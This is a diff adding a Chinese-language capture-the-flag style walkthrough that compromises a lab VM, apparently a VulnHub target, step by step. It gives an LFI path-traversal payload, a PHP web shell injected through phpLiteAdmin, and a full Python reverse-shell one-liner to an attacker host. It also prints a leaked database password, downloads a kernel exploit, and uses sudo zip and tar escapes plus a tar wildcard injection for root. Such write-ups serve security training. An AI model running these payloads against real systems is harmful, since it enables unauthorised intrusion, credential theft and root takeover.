@@ -1,0 +1,242 @@
+VMware双击打开nat模式即可！
+
+1、nmap 192.168.253.174 -p- -A
+22/tcp    open  ssh     OpenSSH 5.9p1
+80/tcp    open  http    Apache httpd 2.2.22
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+38935/tcp open  status  1 (RPC #100024)
+
+
+2、Xray-web信息收集
+访问：http://192.168.253.174/
+
+https://docs.xray.cool/#/README   ---xray使用手册
+
+1）生成证书
+./xray_linux_amd64 genca
+
+2）firefox（火狐浏览器）导入ca证书！
+3）FoxyProxy配置xray 127.0.0.1 7777信息！
+4）运行：
+./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output proxy.html
+
+
+3、xray-LFI文件包含漏洞
+
+http://192.168.253.174/view.php?page=tools.html
+
+payload：../../../../../../../../../../../../../../../../../../etc/passwd
+存在文件包含漏洞！验证！
+
+http://192.168.253.174/view.php?page=../../../etc/passwd
+存在文件包含漏洞！
+
+
+发现用户：zico
+
+
+4、dirb目录爆破
+dirb http://192.168.253.174/
+
+http://192.168.253.174/dbadmin/test_db.php
+登录页面！
+
+admin弱口令成功登录！
+	 v1.9.3   
+kali搜索发现：php/webapps/24044.txt
+cp /usr/share/exploitdb/exploits/php/webapps/24044.txt .
+
+
+5、phpLiteAdmin反弹shell
+
+1）第一步左边创建一个dayu名称的php文件点击Create
+2）Name: 12   Number of Fields: 12   ---点击Go
+3）Field：填写任意名称   Type类型：Text    Default Value：放入shellcode
+"<?php echo system($_GET["cmd"]); ?>"
+然后点击Create！
+
+
+Table 'dayu' has been created.
+CREATE TABLE 'dayu' ('name' TEXT default '"<?php echo system($_GET["cmd"]); ?>"')
+显示了目录：如果没有左边写文件名默认为1
+/usr/databases/1
+
+
+http://192.168.253.174/view.php?page=../../../usr/databases/dayu2&cmd=whoami
+可以看到是www-data www-data权限！
+
+http://192.168.253.174/view.php?page=../../../usr/databases/dayu2&cmd=which%20python
+可以看到'"/usr/bin/python /usr/bin/python"'安装了python！
+
+nc -vlp 6666
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.166",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+成功获得反弹shell！
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+获得稳定shell！
+
+
+
+6、内网信息枚举
+
+linpeas
+
+1）Linux version 3.2.0-23-generic
+2）Sudo version 1.8.3p1
+3）127.0.0.1:3306
+/home/zico/wordpress/wp-config.php
+define('DB_NAME', 'zico');
+define('DB_USER', 'zico');
+define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
+define('DB_HOST', 'zico');
+
+
+7、提权
+
+1）内核提权
+searchsploit Linux Kernel 3.2.0-23
+linux_x86-64/local/33589.c
+
+locate linux_x86-64/local/33589.c
+cp /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c .
+python -m SimpleHTTPServer 8081
+wget http://192.168.253.166:8081/33589.c
+gcc 33589.c -O2 -o dayu1
+chmod +x dayu1
+./dayu1 0
+执行完，直接CPU崩溃，系统重启！！！慎用！！
+
+
+https://www.exploit-db.com/exploits/26131
+locate linux_x86-64/local/26131.c
+cp /usr/share/exploitdb/exploits/linux_x86-64/local/26131.c .
+执行完，直接CPU崩溃，系统重启！！！慎用！！
+
+
+2）sudo 提权 zip
+
+ssh zico@192.168.253.174
+sWfCsfJSPV9H3AmQzw8
+
+sudo -l
+User zico may run the following commands on this host:
+    (root) NOPASSWD: /bin/tar
+    (root) NOPASSWD: /usr/bin/zip
+
+二进制：
+https://gtfobins.github.io/gtfobins/zip/
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+
+或者使用命令：
+使用zip命令中可用的–unzip-command选项在压缩文件时运行bash shell：
+sudo zip /tmp/1.zip /home/zico/dayu -T --unzip-command="sh -c /bin/bash"
+
+
+2）sudo提权tar
+https://gtfobins.github.io/gtfobins/tar/
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+
+tar另外一种用法：
+
+find提权 (其实这里也是使用了tar进行执行提权，然后转到find，重点是find执行命令提权)
+查看是否存在find命令setuid执行权限：
+find / -perm -4000 2>/dev/null | grep find
+
+通过tar命令创建find命令具备setuid执行权限：
+cd /tmp
+echo "chmod u+s /usr/bin/find" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1    -----创建两个文件，方便通过tar命令将此文件当做命令去执行！
+sudo tar cf archive.tar *
+
+创建完成确认find命令是否成功被赋予setuid权限：
+find / -perm -4000 2>/dev/null | grep find
+执行find命令开始提权
+find /tmp -exec sh -i \;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
